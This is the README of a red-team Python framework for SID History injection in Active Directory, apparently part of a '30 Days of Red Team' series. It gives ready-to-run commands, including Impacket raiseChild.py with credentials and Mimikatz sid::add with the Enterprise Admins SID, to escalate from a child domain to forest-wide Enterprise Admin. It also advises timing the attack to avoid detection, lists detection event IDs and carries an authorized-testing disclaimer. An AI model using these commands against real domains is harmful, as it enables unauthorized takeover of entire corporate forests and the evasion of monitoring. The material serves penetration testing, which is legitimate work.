# RT SID History Injection Framework

**Escalate Privileges Across Domain Boundaries**

Part of the **30 Days of Red Team** toolkit by Maxwell Cross.

## Overview

A modular Python framework for SID History injection attacks. Escalate from Domain Admin in a child domain to Enterprise Admin in the forest root.

## Attack Theory

When domains trust each other (parent-child or forest trusts), Kerberos tickets can include "SID History" - a list of additional SIDs that grant access as if the user were a member of those groups.

By injecting the Enterprise Admins SID (always `<ForestRootDomainSID>-519`) into a user's SID History, that user gains Enterprise Admin privileges across the entire forest.

## Features

- **SID Enumeration**: Get domain SIDs and user SID history
- **Multiple Injection Methods**: Mimikatz, Impacket raiseChild
- **Attack Planning**: Automated attack plan generation
- **MITRE ATT&CK Mapping**: Techniques documented and mapped

## Installation

```bash
# Clone the toolkit
git clone https://github.com/maxwellcross-labs/30-days-redteam.git
cd 30-days-redteam/rt_sid_history

# Install dependencies (optional - for LDAP enumeration)
pip install ldap3
```

### Tool Dependencies

| Method | Tool Required | Platform |
|--------|---------------|----------|
| Mimikatz | mimikatz.exe | Windows |
| Impacket | raiseChild.py | Linux/Windows |

## Quick Start

```bash
# Generate attack plan
python -m rt_sid_history -d child.corp.local -f corp.local -u admin -p 'P@ssw0rd' --action plan

# Enumerate Enterprise Admins SID
python -m rt_sid_history -d corp.local -f corp.local -u admin -p 'P@ssw0rd' --action enum

# Verify user SID history
python -m rt_sid_history -d child.corp.local -f corp.local -u admin -p 'P@ssw0rd' \\
  --action verify --target-user administrator
```

## Project Structure

```
rt_sid_history/
├── __init__.py              # Package initialization
├── __main__.py              # Module entry point
├── cli.py                   # Command-line interface
├── framework.py             # Main orchestrator
├── models/
│   ├── __init__.py
│   └── injection_target.py  # Data models
├── enumerators/
│   ├── __init__.py
│   └── sid_enumerator.py    # SID enumeration
├── injectors/
│   ├── __init__.py
│   ├── base.py              # Base injector class
│   ├── mimikatz.py          # Mimikatz injection
│   └── impacket.py          # Impacket raiseChild
├── planners/
│   ├── __init__.py
│   └── attack_planner.py    # Attack plan generation
└── utils/
    ├── __init__.py
    └── sid_utils.py         # SID manipulation utilities
```

## Programmatic Usage

```python
from rt_sid_history import SIDHistoryFramework

# Initialize
framework = SIDHistoryFramework(output_dir="./results")

# Register domains
framework.register_domain(
    domain="child.corp.local",
    username="admin",
    password="P@ssw0rd",
    is_forest_root=False
)

framework.register_domain(
    domain="corp.local",
    username="admin",
    password="P@ssw0rd",
    is_forest_root=True
)

# Get Enterprise Admins SID
ea_sid = framework.get_enterprise_admins_sid(
    "corp.local", "admin", "P@ssw0rd"
)

# Generate Mimikatz commands
operation = framework.inject_sid_history_mimikatz(
    target_user="administrator",
    target_domain="child.corp.local",
    sid_to_inject=ea_sid
)

# Generate report
framework.generate_report()
```

## Attack Scenarios

### Child-to-Parent Escalation

Most common scenario: DA on child domain → EA on forest root

```bash
# Automated with Impacket
raiseChild.py child.corp.local/administrator:'P@ssw0rd'@10.0.0.10

# Manual with Mimikatz
mimikatz # privilege::debug
mimikatz # sid::add /sam:administrator /new:S-1-5-21-XXXXX-519
```

### Forest Trust Exploitation

More complex: requires SID filtering to be disabled

```python
scenario = framework.planner.create_forest_trust_scenario(
    source_forest=source_info,
    target_forest=target_info,
    target_user="administrator"
)
```

## Well-Known RIDs

| RID | Group |
|-----|-------|
| 500 | Administrator |
| 502 | KRBTGT |
| 512 | Domain Admins |
| 518 | Schema Admins |
| 519 | Enterprise Admins |

## MITRE ATT&CK Techniques

| Technique | ID |
|-----------|-----|
| SID-History Injection | T1134.005 |
| Golden Ticket | T1558.001 |
| DCSync | T1003.006 |

## Detection

- **Event ID 4765**: SID History added to account
- **Event ID 4766**: SID History add attempt failed
- **Event ID 4662**: Directory Service Access (DCSync)

## OPSEC Considerations

1. DCSync creates detectable events
2. SID History modifications are logged
3. Golden Tickets can be detected
4. Execute during high-activity periods

## Legal Disclaimer

This tool is intended for authorized security testing only. Always obtain written permission before conducting penetration tests. Unauthorized access to computer systems is illegal.

## Author

**Maxwell Cross**  
30 Days of Red Team Series  
[Medium](https://medium.com/@maxwellcross) | [GitHub](https://github.com/maxwellcross-labs)